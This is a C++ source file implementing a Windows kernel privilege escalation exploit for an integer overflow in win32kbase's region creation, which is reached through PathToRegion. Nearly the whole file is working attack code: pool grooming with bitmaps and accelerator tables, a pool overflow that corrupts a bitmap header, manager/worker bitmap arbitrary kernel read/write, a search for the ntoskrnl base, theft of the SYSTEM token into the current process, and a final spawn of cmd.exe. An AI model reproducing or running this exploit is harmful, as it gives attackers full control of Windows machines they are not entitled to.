#include <iostream>

#include "helpers.h"

HBITMAP WORKER_BITMAP = 0;
HBITMAP MANAGER_BITMAP = 0;
static char BOILERPLATE_DATA[0x1000 - 0x258 + 0x50 + 0x8] = { 0 };

static HBITMAP bitmaps[5000];

/*void* arbitrarySizeFree(unsigned long long size) {
	bmp = CreateBitmap(0x52, 1, 1, 32, NULL);

	if (size <= 0x14) {
		return nullptr;
	}

	//NTUSERCONVERTMEMHANDLE NtUserConvertMemHandle = (NTUSERCONVERTMEMHANDLE)GetProcAddress(LoadLibraryA("win32u.dll"), "NtUserConvertMemHandle");
	NTUSERCONVERTMEMHANDLE NtUserConvertMemHandle = (NTUSERCONVERTMEMHANDLE)GetProcAddress(LoadLibraryA("win32u.dll"), "NtUserConvertMemHandle");
	
	size -= 0x14;
	char* buff = (char*)alloca(size);
	memset(buff, 0x41, size - 1);
	buff[size - 1] = '\x00';
	DebugBreak();
	void* ret = NtUserConvertMemHandle(buff, size);

	const char* text = "Get nulled mate";
	SetClipboardData(CF_TEXT, (HANDLE)text);
	EmptyClipboard();

	return ret;
}*/


void* arbitrarySizeAllocate(unsigned long long size) {
	size = size - 0x30;
	HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
	memset(GlobalLock(hMem), 0x41, size - 1);
	GlobalUnlock(hMem);
	return SetClipboardData(CF_TEXT, hMem);
}


void acceleratorTableAllocationTester() {
	int a = 0;
	char buff[500];
	std::fill(buff, buff + 500, 0x41);
	for (int i = 0; i < 5; ++i) {
		std::cout << std::hex << leakUserObjectAddress(CreateAcceleratorTableA((LPACCEL)&buff, 20 + i * 2)) << std::endl;
		std::cin >> a;
		std::cout << a;
		DebugBreak();
	}
}

void bitmapAllocationTester() {
	int a = 0;
	for (int i = 0; i < 5; ++i) {
		std::cout << std::hex << leakSurfaceAddress(CreateBitmap(200 + 15 * i, 1, 1, 32, NULL)) << std::endl;
		std::cin >> a;
		std::cout << a;
		DebugBreak();
	}
}

void groomPool() {
	// The requested allocation size will be 0x50.
	// So, we need to create holes of 0x50 in the Paged Session Pool
	// at the end of the page, then allocate a bitmap at the beginning
	// of the next page. The following should be a good general pool layout:
	// [ Bitmap - Gh05 Size: 0xFC0] [ Free - 0x40 (0x30 + 0x10 header)]
	// We then assume that 'Free' wil then be used by Grgn allocation, 
	// then we'll use the overflow to overwrite the bitmap's sizlBitmap
	// property, and then use GetBitmapBits to determine which bitmap's
	// property was overflowed. Then, the bitmap which we've overflown into
	// will be the MANAGER_BITMAP, and the one following it (next memory page)
	// will be the WORKER_BITMAP.

	// Grooming step #1
	// [-------------------------------Gh05 (0xF40)-------------------------------][--Free (0xC0)--]
	HBITMAP bmp;
	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
	for (int k = 0; k < 5000; k++) {
		// 400 -> 0x590
		// 800 -> 0x8b0
		// 820 -> 0x8e0
		// 1600 -> 0xef0
		// 1630 -> 0xf30
		// 1640 -> 0xf40
		// 1665 -> 0xf70
		// 1680 -> 0xf80
		// 1685 -> 0xf90
		// 1695 -> 0xfb0
		// 1700 -> 0xfc0
		// 1730 -> 0x1000
		// CompatibleBitmap allocation size -> cy * 4 + 0x270
		//bmp = CreateCompatibleBitmap(GetDC(NULL), 1, 0x340);
		// nWidth == sizlBitmap = read boundries.
		bmp = CreateBitmap(1640, 2, 1, 8, NULL);
		//HDC dc = CreateCompatibleDC(NULL);
		//SelectObject(dc, bmp);
		bitmaps[k] = bmp;
	}

	// Grooming step #2
	// [-------------------------------Gh05 (0xF40)-------------------------------][--Usac (0xC0)--]
	// Utilize AcceleratorTable for an 0xC0 allocation.
	static HACCEL atsToFree[5000];
	char buff[500];
	std::fill(buff, buff + 500, 0x41);
	for (int i = 0; i < 5000; ++i) {
		// 36 -> 0x110 alloc
		// 22 -> 0xC0
		atsToFree[i] = CreateAcceleratorTableA((LPACCEL)&buff, 22);
	}

	/*for (int i = 3000; i < 3020; ++i) {
	std::cout << i + 1 << "-\t-\tObject is located at:\t0x" << std::hex << leakUserObjectAddress(atsToFree[i]) << std::endl;
	}
	std::cout << std::endl;
	for (int i = 3500; i < 3520; i++) {
	std::cout << "Surface object is located at:\t0x" << std::hex << leakSurfaceAddress(bitmaps[i]) << std::endl;
	}
	int a = 0;
	std::cin >> a;
	std::cout << a;*/

	for (int i = 0; i < 1000; i++) {
		//arbitrarySizeAllocate(0x90);
		arbitrarySizeAllocate(0xC0);
	}

	// Grooming step #3
	// [-------------------------------Free (0xF40)-------------------------------][--Usac (0xC0)--]
	for (int i = 1000; i < 5000; ++i) {
		DeleteObject(bitmaps[i]);
	}

	// Grooming step #4
	// [----------------Uscb (0x9B0)----------------][--------Free (0x590)--------][--Usac (0xC0)--]
	for (int i = 0; i < 6000; i++) {
		arbitrarySizeAllocate(0x9B0);
	}

	// Grooming step #5
	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Usac (0xC0)--]
	for (int k = 0; k < 5000; k++) {
		bmp = CreateBitmap(200, 1, 1, 32, NULL);
		bitmaps[k] = bmp;
	}
	
	// Grooming step #6
	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Free (0xC0)--]
	for (int i = 3000; i < 5000; ++i) {
		DestroyAcceleratorTable(atsToFree[i]);
	}
}


void testAddEdgeToGET() {
	static POINT points[0x100];
	ULONG x = 0x1337;
	ULONG y = 0x30;
	//ULONG y = 0x20;

	HDC hdc = GetDC(NULL);
	HDC hMemDC = CreateCompatibleDC(hdc);
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	
	BeginPath(hMemDC);
	
	for (int i = 0; i < 0x100 - 4; ++i) {
		points[i].x = x;
		points[i].y = y;
	}
	for (int i = 0x100 - 4; i < 0x100; ++i) {
		points[i].x = x;
		points[i].y = --y;

	}
	points[0].y = --y;

	PolylineTo(hMemDC, points, 0x100);
	// End the path
	EndPath(hMemDC);

	//DebugBreak();
	PathToRegion(hMemDC);
}

void exploitOverflow() {
	// The vulnerability is found at win32kbase!RGNMEMOBJ::vCreate
	
	// In the function, a region (Grgn, GDITAG_REGION) is created in memory
	// based on the EPTAHOBJ stored in the a device context. An EPATHOBJ
	// is represnted by a set of _POINTFIX objects. The memory for the
	// region object is allocated in the Paged Session Pool by
	// RGNMEMOBJ::vCreate based on the amount of points held by 
	// the EPTAHOBJ object. vCreate then calls win32kbase.sys!bConstructGET, 
	// which iterates over the path's points and uses them to define the 
	// region object. Points are coppied unto the region object in 
	// win32kbase!AddEdgeToGET, and each one consumes 0x30 (48) bytes 
	// of the region memory chunk.

	// There are two integer overflows when calculating the number of points
	// which should be stored inthe region object, thus enabling an OOB write,
	// more specifically a pool overflow. When groomed properly, we can make
	// the pool allocator allocate the overflowable chunk at the end of a 
	// memory page, adjecent to a memory page storing a bitmap allocation,
	// thus overwriting the _SURFOBJ header and creating a full r/w primitive
	// from the Bitmap object.

	// In order to reach vCreate from user-mode, we can call gdi32!PathToRegion,
	// which will be hendled by win32kfull!NtGdiPathToRegion, which will
	// use our device context to create the argument for vCreate, and call it.
	
	// In order to exploit the vulnerability from user-mode, we must ensure
	// that we have appended enough points to the DC passed unto PathToRegion,
	// so that the integer overflow will occur.

	//Create a Point array 
	//static POINT points[0x3fe01];
	static POINT points[0x3fe04];
	ULONG x = 0x1;
	//ULONG y = 0xDEADBEEF;
	ULONG y = 0x1337;

	// Note: As we don't directly control the value stored in the POINT, we cannot really overwrite pvScan0.
	// However, we can overwrite sizlBitmap. We only need three POINTs: Two are boilerplate POINTs, which 
	// are used to overflow the initial allocation, then the third POINT is used to overwrite the bitmap's
	// size.

	// Get Device context of desktop hwnd
	HDC hdc = GetDC(NULL);
	// Get a compatible Device Context to assign Bitmap to
	HDC hMemDC = CreateCompatibleDC(hdc);
	// Create Bitmap Object
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	// Select the Bitmap into the Compatible DC
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	//Begin path
	BeginPath(hMemDC);

	for (int i = 0; i < 0x3fe04; ++i) {
		points[i].x = x;
		points[i].y = y;
	}
	points[0].y = 0x20;
	points[0].x = 0x20;
	PolylineTo(hMemDC, points, 0x3FE01);
	points[0].y = y;
	// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
	for (int j = 2; j < 0x156; j++) {
		PolylineTo(hMemDC, points, 0x3FE01);
	}

	// Craft specific points.
	const int uniquePointsCount = 0x36; // for a total ox 0x39 points coppied.
	for (int i = 0x3fe02 - uniquePointsCount; i < 0x3fe02; ++i) {
		//points[i].x = ++x;
		points[i].y = --y;
	}

	//PolylineTo(hMemDC, points, 0x3FE01);
	PolylineTo(hMemDC, points, 0x3FE02);
	// End the path
	EndPath(hMemDC);

	// Trigger overflow.
	groomPool();
	//DebugBreak();
	PathToRegion(hMemDC);
}

void mapHdevPage() {
	VOID *fake = VirtualAlloc((void*)0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(fake, 0x1, 0x100);
}


void resolveWorkerManager() {
	char buff[0x1000] = { 0 };
	unsigned long result = 0;
	//DebugBreak();
	for (int i = 0; i < 5000; ++i) {
		HBITMAP currentBitmap = bitmaps[i];
		unsigned long long address = (unsigned long long)leakSurfaceAddress(currentBitmap);		
		result = GetBitmapBits(currentBitmap, 0x1000, buff);
		if (result == 0x1000) {
			MANAGER_BITMAP = currentBitmap;
			for (int j = 0; j < 5000; ++j) {
				unsigned long long workerAddress = (unsigned long long)leakSurfaceAddress(bitmaps[j]);
				if (0x1000 == workerAddress - address) {
					WORKER_BITMAP = bitmaps[j];
					//DebugBreak();
					break;
				}
			}
			break;
		}

	}
}

void fixHeaders() {
	// pvScan0 buffer is 0x258 bytes after the SURFACE header.
	// In order to avoid crashing, we need to do the following:
	// 1. Fix overflown (manager) bitmap's _POOL_HEADER. This can be done by copying the _POOL_HEADER of the next bitmap,
	//    which can be retrieved by reading 0x1000 bytes from the manager's pvScan0 buffer and then copying 0x10 bytes
	//    beginning at 0x1000 - 0x258 - 0x10.
	// 2. Save all data between *MANAGER.pvScan0 and WORKER.pvScan0 and append to before the address whenever we want to read/write
	//    from an address. This data is the first 0x1000 - 0x258 + 0x50 bytes we can read using our manager bitmap.
	// TODO: fixing the pool header is a bit more compilcated than this..

	char buff[0x1000] = { 0 };
	unsigned int result = 0;
	
	result = GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
	if (result != 0x1000) {
		DebugBreak();
	}

	//DebugBreak();
	memcpy(BOILERPLATE_DATA, buff, sizeof(BOILERPLATE_DATA) - 0x8);
	unsigned long long address = (unsigned long long)leakSurfaceAddress(MANAGER_BITMAP) - 0x10;
	writeQword(address, (void*)&buff[0x1000 - 0x258 - 0x10]);
	writeQword(address + 0x8, (void*)&buff[0x1000 - 0x258 - 0x10 + 0x8]);
}

unsigned long long readQword(unsigned long long address) {
	unsigned long long data = 0;
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	GetBitmapBits(WORKER_BITMAP, 8, &data);
	return data;
}

void writeQword(unsigned long long address, void* data) {
	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
	SetBitmapBits(WORKER_BITMAP, 8, data);
}

/**************************************************************/
// Copy-Pasted from HevdGdiExploitation
unsigned long long getNtoskrnlBase() {
	unsigned long long baseAddress = 0;
	//DebugBreak();
	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
	unsigned long long signature = 0x00905a4d;
	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;
	while (true) {
		unsigned long long readData = readQword(searchAddress);
		if ((readData & 0x00000000FFFFFFFF) == signature) {
			baseAddress = searchAddress;
			break;
		}
		searchAddress = searchAddress - 0x1000;
	}
	return baseAddress;
}
unsigned long long PsInitialSystemProcess() {
	unsigned long long systemProcessAddress;
	DebugBreak();
	unsigned long long kernelNtos = getNtoskrnlBase();
	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;
	void* userNtos = LoadLibraryA("ntoskrnl.exe");
	systemProcessAddress = kernelNtos +
		((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);
	std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
	return readQword(systemProcessAddress);
}

void elevatePrivileges() {
	unsigned long long systemProcess;
	unsigned long long currentProcess;
	void* systemToken;
	unsigned long pid;
	//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
	//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
	//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
	unsigned long long tokenOffset = 0x358;
	unsigned long long activeProcessLinksOffset = 0x2f0;
	unsigned long long pidOffset = 0x2e8;
	unsigned long currentPid = GetCurrentProcessId();
	systemProcess = PsInitialSystemProcess();
	std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
	systemToken = (void*)readQword(systemProcess + tokenOffset);
	std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;
	currentProcess = systemProcess;
	do {
		currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
		pid = readQword(currentProcess + pidOffset);
	} while (pid != currentPid);
	std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;
	writeQword(currentProcess + tokenOffset, &systemToken);
}

int main() {
	/***
	Exploitation steps:
	1/2. Pool Grooming
	2/1. Craft device context for overflowing when calling PathToRegion
	3. Call PathToRegion to trigger overflow
	4. Use Bitmap primitives to elevate privileges.
	***/
	//groomPool();
	//bitmapAllocationTester();
	//acceleratorTableAllocationTester();

	//testAddEdgeToGET();
	

	exploitOverflow();
	mapHdevPage();
	resolveWorkerManager();
	fixHeaders();
	elevatePrivileges();

	int a = 0;
	std::cin >> a;
	std::cout << a;

	system("cmd.exe");

	return 0;
}